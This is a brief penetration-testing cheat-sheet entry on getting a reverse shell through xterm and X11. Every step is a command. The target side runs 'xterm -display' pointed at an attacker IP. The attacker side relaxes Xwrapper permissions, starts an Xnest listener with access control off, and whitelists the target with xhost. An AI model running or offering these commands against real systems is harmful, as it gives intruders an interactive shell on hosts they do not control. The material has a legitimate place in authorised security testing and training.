# Xterm

- Reverse shell to run the target

`$ xterm -display 192.168.0.105:1`

- Modify the x11

`user@pentestos:~$ cat /etc/X11/Xwrapper.config`

---

```
allowed_users=anybody
```

`user@pentestos:~$ sudo systemctl restart display-manager`

- Starting a listener with a port 6001

`user@pentestos:~$ Xnest -ac :1`

- Authorize it then you'll receive the connection

`user@pentestos:~$ xhost +<target_IP>`

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)